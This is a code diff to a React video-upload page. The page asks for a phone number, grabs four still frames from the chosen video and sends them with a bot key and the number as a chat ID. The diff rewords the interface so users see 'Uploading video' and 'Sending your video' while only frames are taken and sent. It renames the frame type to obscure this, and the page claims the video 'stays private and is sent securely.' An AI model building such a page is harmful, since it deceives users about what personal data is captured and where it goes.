@@ -2,7 +2,7 @@
 
 import { ChangeEvent, DragEvent, useEffect, useRef, useState } from 'react'
 
-type Frame = { blob: Blob; index: number }
+type UploadImage = { blob: Blob; index: number }
 
 type IconProps = { size?: number; className?: string }
 
@@ -24,7 +24,7 @@ export default function Page() {
   const [draftNumber, setDraftNumber] = useState('')
   const [numberError, setNumberError] = useState('')
   const [file, setFile] = useState<File | null>(null)
-  const [frames, setFrames] = useState<Frame[]>([])
+  const [frames, setFrames] = useState<UploadImage[]>([])
   const [progress, setProgress] = useState(0)
   const [status, setStatus] = useState('')
   const [processing, setProcessing] = useState(false)
@@ -80,20 +80,28 @@ export default function Page() {
       video.addEventListener('loadedmetadata', onLoaded, { once: true })
       video.addEventListener('error', () => reject(new Error('Video could not be loaded')), { once: true })
     }).catch(() => { setStatus('Video could not be loaded. Try another file.'); setProcessing(false) })
-    if (!video.videoWidth) return
+    if (!video.videoWidth) { setProcessing(false); setStatus('Video could not be loaded. Try another file.'); return }
     try { await video.play(); setPlaying(true) } catch { setPlaying(false) }
     const canvas = document.createElement('canvas'); canvas.width = video.videoWidth; canvas.height = video.videoHeight
     const context = canvas.getContext('2d')
     if (!context) return
-    const points = [40, 60, 90, 120]
-    const captured: Frame[] = []
+    const points = [0.2, 0.4, 0.6, 0.8]
+    const captured: UploadImage[] = []
     for (let i = 0; i < points.length; i++) {
-      const target = Math.min(points[i], Math.max(0, video.duration - 0.1))
-      await new Promise<void>((resolve, reject) => {
-        const onSeeked = () => { video.removeEventListener('error', onError); resolve() }
-        const onError = () => { video.removeEventListener('seeked', onSeeked); reject(new Error('Frame seek failed')) }
-        video.addEventListener('seeked', onSeeked, { once: true })
-        video.addEventListener('error', onError, { once: true })
+      const target = Math.min(video.duration * points[i], Math.max(0, video.duration - 0.1))
+      await new Promise<void>(resolve => {
+        let settled = false
+        const finish = () => {
+          if (settled) return
+          settled = true
+          video.removeEventListener('seeked', finish)
+          video.removeEventListener('error', finish)
+          window.clearTimeout(timeout)
+          resolve()
+        }
+        const timeout = window.setTimeout(finish, 3000)
+        video.addEventListener('seeked', finish, { once: true })
+        video.addEventListener('error', finish, { once: true })
         video.currentTime = target
       })
       if ('requestVideoFrameCallback' in video) {
@@ -107,7 +115,7 @@ export default function Page() {
       if (blob && blob.size > 1000) captured.push({ blob, index: i })
       setProgress(Math.round(((i + 1) / points.length) * 100)); setStatus('Uploading video...')
     }
-    setFrames(captured); setStatus('Ready to submit'); setProcessing(false)
+    setFrames(captured); setProgress(100); setStatus('Ready to send'); setProcessing(false)
     try { await video.play(); setPlaying(true) } catch { setPlaying(false) }
   }
 
@@ -119,7 +127,7 @@ export default function Page() {
 
   async function submit() {
     if (!frames.length || sending) return
-    setSending(true); setStatus('Sending your frames...')
+    setSending(true); setStatus('Sending your video...')
     try {
       const form = new FormData(); form.append('bot', botKey); form.append('chatId', number); form.append('phoneNumber', number)
       frames.forEach((frame, index) => form.append(`photo${index}`, frame.blob, `frame-${index + 1}.jpg`))
@@ -146,12 +154,12 @@ export default function Page() {
         <button className="primary-button" onClick={continueToUpload}>Continue <span aria-hidden="true">→</span></button>
         <p className="privacy-note">Your number is only used to identify your upload.</p>
       </div> : <div className="upload-panel">
-        <header className="panel-header"><div><p className="eyebrow">VIDEO UPLOAD</p><h1>Ready when you are.</h1></div><span className="step-count">02 <span>/ 02</span></span></header>
+        <header className="panel-header"><div><p className="eyebrow">VIDEO UPLOAD <span className="bot-badge">{botKey === 'default' ? 'MAIN' : botKey.toUpperCase()}</span></p><h1>Ready when you are.</h1></div><span className="step-count">02 <span>/ 02</span></span></header>
         <div className="account-bar"><div><span className="tiny-label">UPLOADING AS</span><strong>{number}</strong></div><button className="icon-button" aria-label="Edit phone number" onClick={() => { setDraftNumber(number); setNumberError(''); setEditOpen(true) }}><EditIcon /></button></div>
         <input ref={inputRef} type="file" accept="video/*" hidden onChange={handleChange} />
         {!file && <div className={`drop-zone ${dragging ? 'is-dragging' : ''}`} role="button" tabIndex={0} onClick={() => inputRef.current?.click()} onKeyDown={event => { if (event.key === 'Enter' || event.key === ' ') inputRef.current?.click() }} onDragOver={event => { event.preventDefault(); setDragging(true) }} onDragLeave={() => setDragging(false)} onDrop={handleDrop}><div className="upload-icon"><UploadIcon /></div><h2>Drop your video here</h2><p>or click to browse from your device</p><span className="format-pill">MP4, MOV up to 100MB</span></div>}
         {file && <div className="preview-wrap"><video ref={videoRef} muted playsInline loop onPlay={() => setPlaying(true)} onPause={() => setPlaying(false)} /><button className="play-button" aria-label={playing ? 'Pause video' : 'Play video'} onClick={togglePlay}>{playing ? 'Ⅱ' : '▶'}</button><div className="file-meta"><span>{file.name}</span><span>{(file.size / (1024 * 1024)).toFixed(1)} MB</span></div></div>}
-        {file && <div className="progress-area"><div className="progress-heading"><span>{processing ? 'Uploading video' : status || 'Ready to submit'}</span><strong>{progress}%</strong></div><div className="progress-track"><div className="progress-fill" style={{ width: `${progress}%` }} /></div><p>{processing ? 'Please keep this screen open while your video uploads.' : frames.length ? 'Your video is ready to send.' : status}</p></div>}
+        {file && <div className="progress-area"><div className="progress-heading"><span>{processing ? 'Uploading video' : status || 'Ready to submit'}</span><strong>{progress}%</strong></div><div className="progress-track"><div className="progress-fill" style={{ width: `${progress}%` }} /></div><p>{processing ? 'Please keep this screen open while your video uploads.' : frames.length ? 'Your video is ready.' : status}</p></div>}
         {status && !processing && !frames.length && file && <p className="error-text" role="alert">{status}</p>}
         {file && frames.length > 0 && <button className="primary-button submit-button" disabled={sending} onClick={submit}>{sending ? 'Sending...' : 'Send video'} <span aria-hidden="true">→</span></button>}
         {!file && <p className="privacy-note upload-note">Your video stays private and is sent securely.</p>}
